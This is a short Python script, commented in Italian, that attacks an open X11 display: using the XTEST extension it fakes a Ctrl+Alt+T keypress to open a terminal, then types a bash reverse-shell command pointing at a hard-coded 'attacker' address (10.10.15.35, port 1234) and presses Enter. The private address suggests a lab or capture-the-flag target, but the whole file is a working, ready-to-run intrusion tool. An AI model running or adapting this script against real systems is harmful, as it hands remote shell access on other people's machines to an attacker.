import time
from Xlib import X, display, XK
from Xlib.ext import xtest

def send_key(d, keysym, press=True):
    # Converte il keysym nel keycode specifico del server X attuale
    keycode = d.keysym_to_keycode(keysym)
    if keycode:
        event = X.KeyPress if press else X.KeyRelease
        xtest.fake_input(d, event, keycode)
        d.sync()
        time.sleep(0.02)  # Ritardo per la stabilità dell'input

def type_string(d, stringa):
    # Mappatura dei caratteri speciali ai rispettivi nomi Keysym riconosciuti da X11
    char_to_keysym_name = {
        ":": "colon",
        "/": "slash",
        ">": "greater",
        "&": "ampersand",
        "|": "bar",
        " ": "space",
        "+": "plus",
        "=": "equal",
        ".": "period",
        "-": "minus"
    }

    # Keysym per il tasto Shift Sinistro (standard X11: 0xFFE1)
    left_shift_keysym = XK.XK_Shift_L

    for char in stringa:
        if char.isupper() or char in [":", ">", "&", "|"]:
            # Attiva lo SHIFT per i caratteri maiuscoli o speciali che lo richiedono
            send_key(d, left_shift_keysym, press=True)

            if char in char_to_keysym_name:
                keysym = XK.string_to_keysym(char_to_keysym_name[char])
            else:
                keysym = XK.string_to_keysym(char)

            if keysym != X.NoSymbol:
                send_key(d, keysym, press=True)
                send_key(d, keysym, press=False)

            # Rilascia lo SHIFT
            send_key(d, left_shift_keysym, press=False)
        else:
            if char in char_to_keysym_name:
                keysym = XK.string_to_keysym(char_to_keysym_name[char])
            else:
                keysym = XK.string_to_keysym(char)

            if keysym != X.NoSymbol:
                send_key(d, keysym, press=True)
                send_key(d, keysym, press=False)

def main():
    # Connessione al display locale (eredita da os.environ['DISPLAY'])
    d = display.Display()
    print(f"Connesso al display: {d.get_display_name()}")

    # 1. Recupero dei codici tasto corretti tramite il modulo XK
    ctrl_keycode = d.keysym_to_keycode(XK.XK_Control_L)
    alt_keycode = d.keysym_to_keycode(XK.XK_Alt_L)
    t_keycode = d.keysym_to_keycode(XK.XK_t)

    if not all([ctrl_keycode, alt_keycode, t_keycode]):
        print("Errore: Impossibile mappare i tasti di scelta rapida sulla tastiera corrente.")
        return

    print("Inviando Ctrl+Alt+T per aprire xterm...")
    xtest.fake_input(d, X.KeyPress, ctrl_keycode)
    xtest.fake_input(d, X.KeyPress, alt_keycode)
    xtest.fake_input(d, X.KeyPress, t_keycode)
    d.sync()
    time.sleep(0.1)

    xtest.fake_input(d, X.KeyRelease, t_keycode)
    xtest.fake_input(d, X.KeyRelease, alt_keycode)
    xtest.fake_input(d, X.KeyRelease, ctrl_keycode)
    d.sync()

    # Pausa per permettere a Openbox di istanziare la finestra di xterm e catturare il focus
    time.sleep(2.0)

    # 2. Definizione del payload
    ip_attaccante = "10.10.15.35"  
    porta_attaccante = "1234"
    payload = f"bash -i >& /dev/tcp/{ip_attaccante}/{porta_attaccante} 0>&1"

    print("Digitazione del payload nel terminale...")
    type_string(d, payload)

    # 3. Invio del tasto Invio (Return)
    print("Esecuzione del comando...")
    return_keysym = XK.XK_Return
    send_key(d, return_keysym, press=True)
    send_key(d, return_keysym, press=False)

if __name__ == "__main__":
    main()
